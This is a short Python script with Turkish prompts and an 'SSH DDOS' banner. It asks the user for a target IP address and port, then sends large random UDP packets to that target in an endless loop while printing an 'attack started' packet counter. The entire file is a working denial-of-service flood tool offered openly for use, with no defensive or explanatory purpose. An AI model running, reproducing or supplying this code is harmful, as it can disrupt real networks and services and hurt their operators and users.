import socket
import random
import os
os.system("clear")
banner="""
\u001b[33m:'######:::'######::'##::::'##::::'########::'########:::'#######:::'######::
'##... ##:'##... ##: ##:::: ##:::: ##.... ##: ##.... ##:'##.... ##:'##... ##:
 ##:::..:: ##:::..:: ##:::: ##:::: ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::
. ######::. ######:: #########:::: ##:::: ##: ##:::: ##: ##:::: ##:. ######::
:..... ##::..... ##: ##.... ##:::: ##:::: ##: ##:::: ##: ##:::: ##::..... ##:
'##::: ##:'##::: ##: ##:::: ##:::: ##:::: ##: ##:::: ##: ##:::: ##:'##::: ##:
. ######::. ######:: ##:::: ##:::: ########:: ########::. #######::. ######::
:......::::......:::..:::::..:::::........:::........::::.......::::......:::
"""
print (banner)

hedef_ip=input("\u001b[35mHedef ip :  ")
hedef_port=input("\u001b[35m Hedef Port :  ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
	       sock.sendto(bytes,(hedef_ip,int(hedef_port)))
	       sayac=sayac+1
	       print("\u001b[32msaldiri baslatildi,gonderilen paket sayisi:%s \u001b[37m"%(sayac))
